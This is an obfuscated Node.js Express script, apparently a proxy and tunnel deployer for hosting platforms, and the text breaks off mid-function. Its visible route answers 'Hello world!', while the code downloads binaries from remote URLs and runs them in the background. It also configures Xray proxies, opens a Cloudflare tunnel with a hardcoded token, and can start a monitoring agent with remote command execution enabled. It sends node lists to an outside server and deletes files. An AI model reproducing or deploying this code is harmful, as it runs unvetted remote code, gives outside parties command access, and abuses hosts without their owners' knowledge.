const _0x3463b6=_0x1629;function _0x1629(_0x1afa47,_0x39f82d){const _0x303510=_0x3035();return _0x1629=function(_0x162980,_0x59351e){_0x162980=_0x162980-0x99;let _0x3a4fea=_0x303510[_0x162980];return _0x3a4fea;},_0x1629(_0x1afa47,_0x39f82d);}(function(_0x17818a,_0xc2b0af){const _0x48f100={_0x263788:0xa4,_0x151c63:0x148,_0x53b680:0xa5,_0x5c7ecc:0x13e,_0x4b67d8:0x146,_0x1970e0:0xc7,_0x5d9dd4:0x121},_0x32043b=_0x1629,_0x169464=_0x17818a();while(!![]){try{const _0x3f1d83=-parseInt(_0x32043b(0x156))/0x1+parseInt(_0x32043b(_0x48f100._0x263788))/0x2+parseInt(_0x32043b(_0x48f100._0x151c63))/0x3*(-parseInt(_0x32043b(0xc1))/0x4)+parseInt(_0x32043b(0xbd))/0x5+-parseInt(_0x32043b(_0x48f100._0x53b680))/0x6*(parseInt(_0x32043b(_0x48f100._0x5c7ecc))/0x7)+-parseInt(_0x32043b(0x9b))/0x8*(-parseInt(_0x32043b(_0x48f100._0x4b67d8))/0x9)+-parseInt(_0x32043b(_0x48f100._0x1970e0))/0xa*(-parseInt(_0x32043b(_0x48f100._0x5d9dd4))/0xb);if(_0x3f1d83===_0xc2b0af)break;else _0x169464['push'](_0x169464['shift']());}catch(_0x3f9469){_0x169464['push'](_0x169464['shift']());}}}(_0x3035,0x2315a));const express=require(_0x3463b6(0xde)),app=express(),axios=require(_0x3463b6(0xa2)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x3463b6(0xfa)),exec=promisify(require(_0x3463b6(0xd6))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x3463b6(0x13c)][_0x3463b6(0xb4)]||'',PROJECT_URL=process[_0x3463b6(0x13c)]['PROJECT_URL']||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process['env'][_0x3463b6(0xbc)]||_0x3463b6(0xe3),SUB_PATH=process[_0x3463b6(0x13c)][_0x3463b6(0x150)]||'test',PORT=process[_0x3463b6(0x13c)][_0x3463b6(0xfc)]||process['env'][_0x3463b6(0xae)]||0xbb8,UUID=process['env'][_0x3463b6(0xdf)]||_0x3463b6(0x11c),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3463b6(0x13c)][_0x3463b6(0xaa)]||'',NEZHA_KEY=process[_0x3463b6(0x13c)][_0x3463b6(0xa7)]||'',ARGO_DOMAIN=process['env'][_0x3463b6(0x9e)]||_0x3463b6(0xdb),ARGO_AUTH=process[_0x3463b6(0x13c)][_0x3463b6(0x12f)]||_0x3463b6(0x13f),ARGO_PORT=process['env'][_0x3463b6(0x14a)]||0x1f41,CFIP=process[_0x3463b6(0x13c)][_0x3463b6(0xa6)]||'cdns.doon.eu.org',CFPORT=process['env'][_0x3463b6(0xf6)]||0x1bb,NAME=process[_0x3463b6(0x13c)][_0x3463b6(0xdd)]||_0x3463b6(0xc9);!fs[_0x3463b6(0xcf)](FILE_PATH)?(fs[_0x3463b6(0x9d)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x3463b6(0x9c)](FILE_PATH+_0x3463b6(0x11d));function generateRandomName(){const _0x61cdf={_0x3678a2:0x122,_0x3aea30:0xda},_0x4044de=_0x3463b6,_0x1056e8=_0x4044de(0x10c);let _0x10fedc='';for(let _0x250d58=0x0;_0x250d58<0x6;_0x250d58++){_0x10fedc+=_0x1056e8[_0x4044de(0x140)](Math[_0x4044de(_0x61cdf._0x3678a2)](Math[_0x4044de(_0x61cdf._0x3aea30)]()*_0x1056e8[_0x4044de(0x101)]));}return _0x10fedc;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3463b6(0x125)](FILE_PATH,npmName),phpPath=path[_0x3463b6(0x125)](FILE_PATH,phpName),webPath=path[_0x3463b6(0x125)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x3463b6(0x125)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x3463b6(0x144)),bootLogPath=path[_0x3463b6(0x125)](FILE_PATH,_0x3463b6(0x110)),configPath=path[_0x3463b6(0x125)](FILE_PATH,_0x3463b6(0x14b));function deleteNodes(){const _0x1ca030={_0x325ccd:0xcf,_0x31cb79:0x15d,_0x57a775:0x10b,_0x51b84f:0x15d,_0x3cdf0a:0x101,_0x34f77d:0xd2,_0x295870:0x154,_0x6bde0b:0x139},_0x3d2e87=_0x3463b6;try{if(!UPLOAD_URL)return;if(!fs[_0x3d2e87(_0x1ca030._0x325ccd)](subPath))return;let _0x1c5ec9;try{_0x1c5ec9=fs[_0x3d2e87(0xed)](subPath,_0x3d2e87(_0x1ca030._0x31cb79));}catch{return null;}const _0x436c39=Buffer['from'](_0x1c5ec9,_0x3d2e87(0x113))[_0x3d2e87(_0x1ca030._0x57a775)](_0x3d2e87(_0x1ca030._0x51b84f)),_0x146589=_0x436c39['split']('\x0a')[_0x3d2e87(0x119)](_0x1872c3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d2e87(0xf7)](_0x1872c3));if(_0x146589[_0x3d2e87(_0x1ca030._0x3cdf0a)]===0x0)return;return axios[_0x3d2e87(_0x1ca030._0x34f77d)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x3d2e87(_0x1ca030._0x295870)]({'nodes':_0x146589}),{'headers':{'Content-Type':_0x3d2e87(_0x1ca030._0x6bde0b)}})[_0x3d2e87(0xad)](_0x560db8=>{return null;}),null;}catch(_0x488d40){return null;}}function cleanupOldFiles(){const _0x5a9e7a={_0x1c3bb3:0x125,_0x7ba5eb:0xc2,_0x532003:0x114},_0x385994=_0x3463b6;try{const _0x1ba963=fs[_0x385994(0x14d)](FILE_PATH);_0x1ba963[_0x385994(0xc8)](_0x49c94d=>{const _0x587789=_0x385994,_0x32a6fa=path[_0x587789(_0x5a9e7a._0x1c3bb3)](FILE_PATH,_0x49c94d);try{const _0x2c1152=fs[_0x587789(_0x5a9e7a._0x7ba5eb)](_0x32a6fa);_0x2c1152[_0x587789(0xe9)]()&&fs[_0x587789(_0x5a9e7a._0x532003)](_0x32a6fa);}catch(_0x8eb1c7){}});}catch(_0x29158f){}}app[_0x3463b6(0xca)]('/',function(_0x3faa1e,_0x373f17){const _0x3f780a={_0x7c4488:0xe0,_0x471293:0x153},_0x5d69b8=_0x3463b6;_0x373f17[_0x5d69b8(_0x3f780a._0x7c4488)](_0x5d69b8(_0x3f780a._0x471293));});async function generateConfig(){const _0x4066a2={_0x5c0414:0xa9,_0x5814c3:0x14e,_0x402b3e:0x14c,_0x4aa585:0xc5,_0x3b5925:0x14e,_0x20a6bb:0xaf,_0x2cc692:0x129,_0x5f2ad2:0x128,_0x1f422:0x136,_0x267eae:0x128,_0x89888c:0x10f,_0x2f298c:0x11f,_0x53e281:0xd3,_0x532972:0x13d,_0x4ff257:0x13a,_0x2bbab5:0x14b},_0x3a351d=_0x3463b6,_0x11b551={'log':{'access':_0x3a351d(0xa9),'error':_0x3a351d(_0x4066a2._0x5c0414),'loglevel':_0x3a351d(_0x4066a2._0x5814c3)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3a351d(0x14e),'fallbacks':[{'dest':0xbb9},{'path':_0x3a351d(_0x4066a2._0x402b3e),'dest':0xbba},{'path':_0x3a351d(_0x4066a2._0x4aa585),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x3a351d(0x155)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x3a351d(0xaf),'settings':{'clients':[{'id':UUID}],'decryption':_0x3a351d(0x14e)},'streamSettings':{'network':'tcp','security':_0x3a351d(_0x4066a2._0x3b5925)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x3a351d(_0x4066a2._0x20a6bb),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x3a351d(0x14e),'wsSettings':{'path':_0x3a351d(0x14c)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a351d(_0x4066a2._0x2cc692),'tls',_0x3a351d(0xce)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x3a351d(0xd4),'protocol':_0x3a351d(0x157),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3a351d(_0x4066a2._0x4aa585)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a351d(0x129),_0x3a351d(_0x4066a2._0x5f2ad2),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x3a351d(0xd4),'protocol':_0x3a351d(0x12a),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3a351d(_0x4066a2._0x1f422)}},'sniffing':{'enabled':!![],'destOverride':[_0x3a351d(_0x4066a2._0x2cc692),_0x3a351d(_0x4066a2._0x267eae),_0x3a351d(0xce)],'metadataOnly':![]}}],'dns':{'servers':[_0x3a351d(_0x4066a2._0x89888c)]},'outbounds':[{'protocol':_0x3a351d(_0x4066a2._0x2f298c),'tag':_0x3a351d(_0x4066a2._0x53e281)},{'protocol':_0x3a351d(0xb0),'tag':_0x3a351d(_0x4066a2._0x532972)}]};fs[_0x3a351d(_0x4066a2._0x4ff257)](path[_0x3a351d(0x125)](FILE_PATH,_0x3a351d(_0x4066a2._0x2bbab5)),JSON[_0x3a351d(0x154)](_0x11b551,null,0x2));}function getSystemArchitecture(){const _0x2cbc6f={_0x32231a:0xef},_0x3f815d=_0x3463b6,_0x21f652=os[_0x3f815d(_0x2cbc6f._0x32231a)]();return _0x21f652==='arm'||_0x21f652===_0x3f815d(0x12c)||_0x21f652==='aarch64'?'arm':'amd';}function downloadFile(_0x57f4e3,_0x21d002,_0x214b5c){const _0x1834a2={_0x54cf8f:0xcf},_0x22bab3={_0x3d49af:0xd5,_0x1bb6ef:0xfd},_0x2a7b85={_0x48269b:0x120,_0x20d2d0:0xfd},_0x2fe936={_0x2200df:0x15b},_0x3b3e9a={_0x5475d9:0x158,_0x532824:0x9c},_0x35f5c3=_0x3463b6,_0x4a54d1=_0x57f4e3;!fs[_0x35f5c3(_0x1834a2._0x54cf8f)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x16b222=fs['createWriteStream'](_0x4a54d1);axios({'method':'get','url':_0x21d002,'responseType':_0x35f5c3(0x12e)})['then'](_0x3e9604=>{const _0x1f71b1=_0x35f5c3;_0x3e9604[_0x1f71b1(0x12d)][_0x1f71b1(0x127)](_0x16b222),_0x16b222['on'](_0x1f71b1(_0x2a7b85._0x48269b),()=>{const _0x281b28=_0x1f71b1;_0x16b222[_0x281b28(_0x3b3e9a._0x5475d9)](),console[_0x281b28(_0x3b3e9a._0x532824)]('Download\x20'+path[_0x281b28(0xff)](_0x4a54d1)+_0x281b28(0x116)),_0x214b5c(null,_0x4a54d1);}),_0x16b222['on'](_0x1f71b1(_0x2a7b85._0x20d2d0),_0x20017c=>{const _0x273980=_0x1f71b1;fs[_0x273980(0xcd)](_0x4a54d1,()=>{});const _0x29af95='Download\x20'+path[_0x273980(0xff)](_0x4a54d1)+'\x20failed:\x20'+_0x20017c[_0x273980(_0x2fe936._0x2200df)];console[_0x273980(0xfd)](_0x29af95),_0x214b5c(_0x29af95);});})[_0x35f5c3(0xad)](_0x22bf2b=>{const _0x21b0e6=_0x35f5c3,_0x3bde06='Download\x20'+path[_0x21b0e6(0xff)](_0x4a54d1)+_0x21b0e6(_0x22bab3._0x3d49af)+_0x22bf2b[_0x21b0e6(0x15b)];console[_0x21b0e6(_0x22bab3._0x1bb6ef)](_0x3bde06),_0x214b5c(_0x3bde06);});}function _0x3035(){const _0x42b238=['pop','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/web','8443','FILE_PATH','114415HrdjJx','https://ipapi.co/json/','\x20-s\x20','/config.json\x20>/dev/null\x202>&1\x20&','4WhLLOT','statSync','2096','https://arm64.ssss.nyc.mn/agent','/vmess-argo','npm\x20running\x20error:\x20','210NllDGf','forEach','leaflow','get','2083','\x20-p\x20','unlink','quic','existsSync','Error\x20executing\x20command:\x20','Unhandled\x20error\x20in\x20startserver:','post','direct','127.0.0.1','\x20failed:\x20','child_process','all','unshift','win32','random','lee.zaya3.de5.net','https://amd64.ssss.nyc.mn/bot','NAME','express','UUID','send','2087','country_code','./tmp','https://oooo.serv00.net/add-url','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://amd64.ssss.nyc.mn/v1','\x0a\x0avmess://','Skipping\x20adding\x20automatic\x20access\x20task','isFile','includes','config.yaml','Content-Type','readFileSync','Error\x20downloading\x20files:','arch','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Empowerment\x20failed\x20for\x20','Unknown','arm','map','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','CFPORT','test','chmod','listen','util','/api/add-nodes','SERVER_PORT','error','split','basename','Subscription\x20uploaded\x20successfully','length','tunnel.json','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','countryCode','from','2053','\x0avless://','false','toString','abcdefghijklmnopqrstuvwxyz','org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','https+local://8.8.8.8/dns-query','boot.log','\x20-c\x20\x22','Nodes\x20uploaded\x20successfully','base64','unlinkSync','has','\x20successfully','443','platform','filter','https://amd64.ssss.nyc.mn/agent','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','bac4d456-4e13-4911-9fb8-f8626f8c8f3b','\x20already\x20exists','fileName','freedom','finish','12023RBJoaz','floor','?security=tls&sni=','https://arm64.ssss.nyc.mn/web','join','web\x20running\x20error:\x20','pipe','tls','http','trojan','--tls','arm64','data','stream','ARGO_AUTH','App\x20is\x20running','/tunnel.yml\x20run','response','&path=%2Ftrojan-argo%3Fed%3D2560#','php\x20running\x20error:\x20','http://ip-api.com/json/','/trojan-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0a\x20\x20credentials-file:\x20','application/json','writeFileSync','http\x20server\x20is\x20running\x20on\x20port:','env','block','28EzkivX','eyJhIjoiNDJkNWJmMzVhZmYwMTY4NWU3YWIxMjRmOGRlZWUwNjkiLCJ0IjoiODY0ZjZkMjQtMjY3Mi00NGFmLTlkNWItYjVkZjdiNmVkNDk1IiwicyI6IlpURmxNV1ZrT0RZdFpUZGpZeTAwTWpGaExXRTNNak10TkRSak5HUmhNV1JsWkRnNCJ9','charAt','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','NEZHA\x20variable\x20is\x20empty,skip\x20running','status','list.txt','tunnel.yml','639VOjeXk','del\x20/f\x20/q\x20','48162WXSaQv','\x0aclient_secret:\x20','ARGO_PORT','config.json','/vless-argo','readdirSync','none','Add\x20automatic\x20access\x20task\x20faild:\x20','SUB_PATH','match','set','Hello\x20world!','stringify','tcp','49975eJqXwD','vmess','close','firefox','fileUrl','message','push','utf-8','Error\x20in\x20startserver:','ArgoDomain:','15592lhnRPr','log','mkdirSync','ARGO_DOMAIN','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/bot','axios','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','275008lVZEwp','167976jExsfq','CFIP','NEZHA_KEY','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/dev/null','NEZHA_PORT','?encryption=none&security=tls&sni=','rm\x20-rf\x20','catch','PORT','vless','blackhole','\x0a\x20\x20tunnel:\x20','\x20>/dev/null\x202>&1','\x20is\x20running','UPLOAD_URL','https://arm64.ssss.nyc.mn/v1','nohup\x20','\x20>\x20nul\x202>&1'];_0x3035=function(){return _0x42b238;};return _0x3035();}async function downloadFilesAndRun(){const _0x809731={_0x1e92da:0x101,_0x4e7199:0xd7,_0x472591:0xfd,_0x59a610:0xee,_0x1f9dfd:0xb8,_0x1e1276:0x117,_0x721917:0xcb,_0x495b62:0x149,_0x1cf016:0x13a,_0x4e28b0:0xb6,_0x4d48a3:0x141,_0x1d8bae:0xb3,_0x3e41dd:0x117,_0x1917c0:0x108,_0x58847e:0xea,_0x268700:0x12b,_0x446afe:0xbf,_0x3a344d:0xcc,_0x3d964a:0x9c,_0x4a33d7:0x142,_0x9ec895:0xc0,_0x5c6d9e:0xcf,_0x5b6e67:0x151,_0x600a4c:0xe5,_0x45fd83:0x11b,_0x2c1d46:0x103,_0x54c1a2:0xfd,_0x3e50b3:0xd0},_0x3b9879=_0x3463b6,_0x477a58=getSystemArchitecture(),_0x207b26=getFilesForArchitecture(_0x477a58);if(_0x207b26[_0x3b9879(_0x809731._0x1e92da)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0xc8bcbc=_0x207b26[_0x3b9879(0xf4)](_0x4ff636=>{return new Promise((_0x2dbc28,_0x3d9de9)=>{const _0x378355=_0x1629;downloadFile(_0x4ff636[_0x378355(0x11e)],_0x4ff636[_0x378355(0x15a)],(_0x4726e4,_0x286eed)=>{_0x4726e4?_0x3d9de9(_0x4726e4):_0x2dbc28(_0x286eed);});});});try{await Promise[_0x3b9879(_0x809731._0x4e7199)](_0xc8bcbc);}catch(_0x240653){console[_0x3b9879(_0x809731._0x472591)](_0x3b9879(_0x809731._0x59a610),_0x240653);return;}function _0x19066d(_0xc7face){const _0xc9188e={_0x3c9235:0xcf,_0x1c6eb:0xf8},_0x3d3000=0x1fd;_0xc7face['forEach'](_0x59632f=>{const _0x2e8f87=_0x1629;fs[_0x2e8f87(_0xc9188e._0x3c9235)](_0x59632f)&&fs[_0x2e8f87(_0xc9188e._0x1c6eb)](_0x59632f,_0x3d3000,_0x523c81=>{const _0x59677e=_0x2e8f87;_0x523c81?console['error'](_0x59677e(0xf1)+_0x59632f+':\x20'+_0x523c81):console['log']('Empowerment\x20success\x20for\x20'+_0x59632f+':\x20'+_0x3d3000['toString'](0x8));});});}const _0x5b6f5f=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x19066d(_0x5b6f5f);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xe9f13f=NEZHA_SERVER[_0x3b9879(0xea)](':')?NEZHA_SERVER['split'](':')[_0x3b9879(_0x809731._0x1f9dfd)]():'',_0x3b2682=new Set([_0x3b9879(_0x809731._0x1e1276),_0x3b9879(0xbb),_0x3b9879(0xc3),_0x3b9879(0xe1),_0x3b9879(_0x809731._0x721917),_0x3b9879(0x108)]),_0x5ee489=_0x3b2682[_0x3b9879(0x115)](_0xe9f13f)?'true':_0x3b9879(0x10a),_0x176da3=_0x3b9879(_0x809731._0x495b62)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x3b9879(0x105)+_0x5ee489+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x3b9879(_0x809731._0x1cf016)](path[_0x3b9879(0x125)](FILE_PATH,_0x3b9879(0xeb)),_0x176da3);const _0x23b1e8=_0x3b9879(_0x809731._0x4e28b0)+phpPath+_0x3b9879(0x111)+FILE_PATH+_0x3b9879(_0x809731._0x4d48a3);try{await exec(_0x23b1e8),console['log'](phpName+_0x3b9879(_0x809731._0x1d8bae)),await new Promise(_0xca0458=>setTimeout(_0xca0458,0x3e8));}catch(_0x2a19b5){console[_0x3b9879(0xfd)](_0x3b9879(0x134)+_0x2a19b5);}}else{let _0x56a268='';const _0x55f9c0=[_0x3b9879(_0x809731._0x3e41dd),'8443','2096','2087',_0x3b9879(0xcb),_0x3b9879(_0x809731._0x1917c0)];_0x55f9c0[_0x3b9879(_0x809731._0x58847e)](NEZHA_PORT)&&(_0x56a268=_0x3b9879(_0x809731._0x268700));const _0x5312f9=_0x3b9879(_0x809731._0x4e28b0)+npmPath+_0x3b9879(_0x809731._0x446afe)+NEZHA_SERVER+':'+NEZHA_PORT+_0x3b9879(_0x809731._0x3a344d)+NEZHA_KEY+'\x20'+_0x56a268+_0x3b9879(0xa0);try{await exec(_0x5312f9),console[_0x3b9879(_0x809731._0x3d964a)](npmName+_0x3b9879(_0x809731._0x1d8bae)),await new Promise(_0x516c14=>setTimeout(_0x516c14,0x3e8));}catch(_0x3fdd5c){console[_0x3b9879(0xfd)](_0x3b9879(0xc6)+_0x3fdd5c);}}}else console['log'](_0x3b9879(_0x809731._0x4a33d7));const _0x306f93=_0x3b9879(_0x809731._0x4e28b0)+webPath+'\x20-c\x20'+FILE_PATH+_0x3b9879(_0x809731._0x9ec895);try{await exec(_0x306f93),console['log'](webName+'\x20is\x20running'),await new Promise(_0x48b05b=>setTimeout(_0x48b05b,0x3e8));}catch(_0xecb15a){console[_0x3b9879(0xfd)](_0x3b9879(0x126)+_0xecb15a);}if(fs[_0x3b9879(_0x809731._0x5c6d9e)](botPath)){let _0x2f00ea;if(ARGO_AUTH[_0x3b9879(_0x809731._0x5b6e67)](/^[A-Z0-9a-z=]{120,250}$/))_0x2f00ea='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x3b9879(0x151)](/TunnelSecret/)?_0x2f00ea=_0x3b9879(_0x809731._0x600a4c)+FILE_PATH+_0x3b9879(0x131):_0x2f00ea='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x3b9879(_0x809731._0x45fd83)+ARGO_PORT;try{await exec(_0x3b9879(_0x809731._0x4e28b0)+botPath+'\x20'+_0x2f00ea+_0x3b9879(_0x809731._0x2c1d46)),console[_0x3b9879(_0x809731._0x3d964a)](botName+'\x20is\x20running'),await new Promise(_0x437311=>setTimeout(_0x437311,0x7d0));}catch(_0x1b2eac){console[_0x3b9879(_0x809731._0x54c1a2)](_0x3b9879(_0x809731._0x3e50b3)+_0x1b2eac);}}await new Promise(_0x1f8e31=>setTimeout(_0x1f8e31,0x1388));}function getFilesForArchitecture(_0x5c6abd){const _0x49ca32={_0x304206:0xf3,_0x4c80db:0xba,_0x5b8842:0xdc,_0x521bad:0xc4,_0x1de231:0x11a,_0x433d72:0xe6},_0x5c1785=_0x3463b6;let _0x212afc;_0x5c6abd===_0x5c1785(_0x49ca32._0x304206)?_0x212afc=[{'fileName':webPath,'fileUrl':_0x5c1785(0x124)},{'fileName':botPath,'fileUrl':_0x5c1785(0xa1)}]:_0x212afc=[{'fileName':webPath,'fileUrl':_0x5c1785(_0x49ca32._0x4c80db)},{'fileName':botPath,'fileUrl':_0x5c1785(_0x49ca32._0x5b8842)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x27a683=_0x5c6abd==='arm'?_0x5c1785(_0x49ca32._0x521bad):_0x5c1785(_0x49ca32._0x1de231);_0x212afc[_0x5c1785(0xd8)]({'fileName':npmPath,'fileUrl':_0x27a683});}else{const _0x46d4e1=_0x5c6abd==='arm'?_0x5c1785(0xb5):_0x5c1785(_0x49ca32._0x433d72);_0x212afc['unshift']({'fileName':phpPath,'fileUrl':_0x46d4e1});}}return _0x212afc;}function argoType(){const _0x4811e0={_0x52bf58:0x9c,_0x35a5ba:0xea,_0x4fd382:0x13a,_0x1867e1:0xb1,_0x31fd2e:0x138,_0x58d511:0xa8,_0x48820a:0x145},_0x39e265=_0x3463b6;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x39e265(_0x4811e0._0x52bf58)](_0x39e265(0x137));return;}if(ARGO_AUTH[_0x39e265(_0x4811e0._0x35a5ba)]('TunnelSecret')){fs[_0x39e265(_0x4811e0._0x4fd382)](path[_0x39e265(0x125)](FILE_PATH,_0x39e265(0x102)),ARGO_AUTH);const _0x42b475=_0x39e265(_0x4811e0._0x1867e1)+ARGO_AUTH[_0x39e265(0xfe)]('\x22')[0xb]+_0x39e265(_0x4811e0._0x31fd2e)+path['join'](FILE_PATH,_0x39e265(0x102))+_0x39e265(0xa3)+ARGO_DOMAIN+_0x39e265(0xf5)+ARGO_PORT+_0x39e265(_0x4811e0._0x58d511);fs['writeFileSync'](path[_0x39e265(0x125)](FILE_PATH,_0x39e265(_0x4811e0._0x48820a)),_0x42b475);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0xa21eca={_0x23e0de:0x9c,_0x28a0d3:0x125,_0x48ac9b:0x11b,_0x1be201:0x103,_0x50d449:0xb3,_0x38b28b:0xfd},_0x219a06={_0xb4672f:0x12d,_0x1768e4:0xe2,_0x6d067a:0x12d,_0x262a53:0x10d,_0x549db7:0x12d,_0x5f45a1:0x143,_0x5c771c:0x10d,_0x411127:0x106,_0x4f1fd0:0x10d},_0x3a4142={_0x49f53e:0xd9},_0x4d6ac7={_0x4be2cc:0x151,_0x17c22f:0x15c},_0x9b6b37=_0x3463b6;let _0x2a7b51;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2a7b51=ARGO_DOMAIN,console[_0x9b6b37(_0xa21eca._0x23e0de)]('ARGO_DOMAIN:',_0x2a7b51),await _0x2473ab(_0x2a7b51);else try{const _0x1a6ddc=fs['readFileSync'](path['join'](FILE_PATH,_0x9b6b37(0x110)),_0x9b6b37(0x15d)),_0xd13ab7=_0x1a6ddc['split']('\x0a'),_0x463324=[];_0xd13ab7['forEach'](_0x3d16bf=>{const _0x4109f7=_0x9b6b37,_0x113c80=_0x3d16bf[_0x4109f7(_0x4d6ac7._0x4be2cc)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x113c80){const _0xbd1736=_0x113c80[0x1];_0x463324[_0x4109f7(_0x4d6ac7._0x17c22f)](_0xbd1736);}});if(_0x463324['length']>0x0)_0x2a7b51=_0x463324[0x0],console[_0x9b6b37(0x9c)](_0x9b6b37(0x9a),_0x2a7b51),await _0x2473ab(_0x2a7b51);else{console['log'](_0x9b6b37(0xf0)),fs[_0x9b6b37(0x114)](path[_0x9b6b37(_0xa21eca._0x28a0d3)](FILE_PATH,_0x9b6b37(0x110)));async function _0x53125f(){const _0x6f112=_0x9b6b37;try{process[_0x6f112(0x118)]===_0x6f112(_0x3a4142._0x49f53e)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x111499){}}_0x53125f(),await new Promise(_0x1a15e6=>setTimeout(_0x1a15e6,0xbb8));const _0x2ef7ec=_0x9b6b37(0x10e)+FILE_PATH+_0x9b6b37(_0xa21eca._0x48ac9b)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2ef7ec+_0x9b6b37(_0xa21eca._0x1be201)),console[_0x9b6b37(0x9c)](botName+_0x9b6b37(_0xa21eca._0x50d449)),await new Promise(_0xa53032=>setTimeout(_0xa53032,0xbb8)),await extractDomains();}catch(_0x3fd645){console[_0x9b6b37(0xfd)](_0x9b6b37(0xd0)+_0x3fd645);}}}catch(_0x4835d2){console[_0x9b6b37(_0xa21eca._0x38b28b)]('Error\x20reading\x20boot.log:',_0x4835d2);}async function _0x5d2bb1(){const _0x520b88=_0x9b6b37;try{const _0x196a8f=await axios['get'](_0x520b88(0xbe),{'timeout':0xbb8});if(_0x196a8f[_0x520b88(0x12d)]&&_0x196a8f[_0x520b88(_0x219a06._0xb4672f)][_0x520b88(0xe2)]&&_0x196a8f[_0x520b88(_0x219a06._0xb4672f)]['org'])return _0x196a8f[_0x520b88(0x12d)][_0x520b88(_0x219a06._0x1768e4)]+'_'+_0x196a8f[_0x520b88(_0x219a06._0x6d067a)][_0x520b88(_0x219a06._0x262a53)];}catch(_0x3d0f7d){try{const _0x1d3a3f=await axios[_0x520b88(0xca)](_0x520b88(0x135),{'timeout':0xbb8});if(_0x1d3a3f[_0x520b88(0x12d)]&&_0x1d3a3f[_0x520b88(_0x219a06._0x549db7)][_0x520b88(_0x219a06._0x5f45a1)]==='success'&&_0x1d3a3f[_0x520b88(_0x219a06._0x549db7)]['countryCode']&&_0x1d3a3f[_0x520b88(_0x219a06._0x549db7)][_0x520b88(_0x219a06._0x5c771c)])return _0x1d3a3f['data'][_0x520b88(_0x219a06._0x411127)]+'_'+_0x1d3a3f[_0x520b88(0x12d)][_0x520b88(_0x219a06._0x4f1fd0)];}catch(_0x33aaa4){}}return _0x520b88(0xf2);}async function _0x2473ab(_0x4e8fd6){const 